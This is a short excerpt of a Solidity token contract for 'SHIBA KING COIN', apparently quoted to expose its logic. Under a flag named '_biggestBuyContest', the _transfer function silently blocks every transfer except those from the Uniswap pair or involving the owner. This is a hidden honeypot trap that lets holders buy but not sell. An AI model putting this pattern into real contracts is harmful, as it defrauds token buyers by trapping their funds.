...
contract ShibaKingCoin is Context, IERC20, Ownable {
    ...
    string private constant _name = "SHIBA KING COIN"; //
    string private constant _symbol = "SKC"; //
    uint8 private constant _decimals = 9; //

    uint256 public _marketingFee = 2;
    uint256 public _liquidityFee = 2;
    address public  _marketingWallet = 0x0DF90044F473A8E08986741E468133B5525aBc43;
    bool public _biggestBuyContest = false;
    ...
    function _transfer(
        ...
        if(from != owner() && to != owner() && from != uniswapV2Pair && _biggestBuyContest){ return; }
